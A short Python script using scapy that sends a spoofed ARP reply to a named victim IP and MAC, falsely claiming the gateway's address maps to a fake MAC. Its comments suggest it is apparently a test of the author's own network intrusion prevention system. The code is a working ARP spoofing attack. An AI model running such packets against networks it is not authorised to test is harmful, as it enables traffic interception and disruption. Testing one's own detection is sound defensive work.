# test_arp_direct.py
from scapy.all import sendp, ARP, Ether

gateway_ip = "10.79.232.31"

# The MAC address we are faking
fake_mac = "00:11:22:33:44:66"

# The NIPS (Victim) PC's info (from your NIPS log)
victim_ip = "10.79.232.131"
victim_mac = "10:68:38:74:a0:bf"  # <-- From your NIPS "Learn" log

# Your Attacker's interface
ATTACKER_INTERFACE = "Wi-Fi"


print(f"Sending DIRECT fake ARP reply to {victim_ip}...")
print(f"Claiming {gateway_ip} is at {fake_mac}")
print(f"Sending on interface: {ATTACKER_INTERFACE}")



packet = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=fake_mac)

sendp(packet, iface=ATTACKER_INTERFACE, verbose=False) 

print("Fake packet sent! Check your NIPS console.")
